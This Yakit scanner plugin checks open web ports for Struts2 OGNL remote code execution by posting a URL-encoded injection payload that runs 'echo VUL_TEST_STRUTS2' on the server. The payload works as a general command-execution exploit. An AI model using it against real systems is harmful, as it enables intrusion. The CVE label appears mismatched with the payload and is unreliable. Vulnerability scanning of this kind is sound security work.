# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `POST /login.action HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/123.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 583

debug=command&expression=%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22echo%20VUL_TEST_STRUTS2%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()`

    rsp,req,_ = poc.HTTP(packet1, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    
    // 仅修改以下检测条件（保持原有框架不变）
    if poc.GetStatusCodeFromResponse(rsp) == 200 && str.MatchAllOfSubString(rsp, "VUL_TEST_STRUTS2")&& str.Contains(rsp, "Content-Length:") && len(rsp) >0 && !str.Contains(rsp, "Error"){
        yakit.Info("%v found AgentSyste Struts2 RCE漏洞", addr)
        risk.NewRisk(
        addr,
        risk.title("AgentSyste Struts2 远程代码执行"),
        risk.severity("critical"),
        risk.titleVerbose("AgentSyste Struts2 远程代码执行"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("CVE-2017-5638"),
        risk.details("使用安全测试命令验证的Struts2 OGNL注入漏洞"),
        )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
}
